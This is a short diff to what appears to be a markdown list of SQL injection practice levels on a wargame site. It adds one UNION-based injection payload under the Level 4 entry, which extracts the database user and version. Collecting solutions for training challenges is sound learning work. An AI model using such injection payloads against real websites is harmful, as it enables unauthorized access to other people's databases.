@@ -30,6 +30,8 @@
 | [Level 4](http://www.zixem.altervista.org/SQLi/level4.php?ebookid=7) | Normal |
 | ------- | ---------- |
 
+ `?ebookid=-9999' union select user(),version(),3,4,5; -- -`
+
 | [Level 7](http://www.zixem.altervista.org/SQLi/level7.php?id=1) | Medium |
 | ------- | ---------- |
 
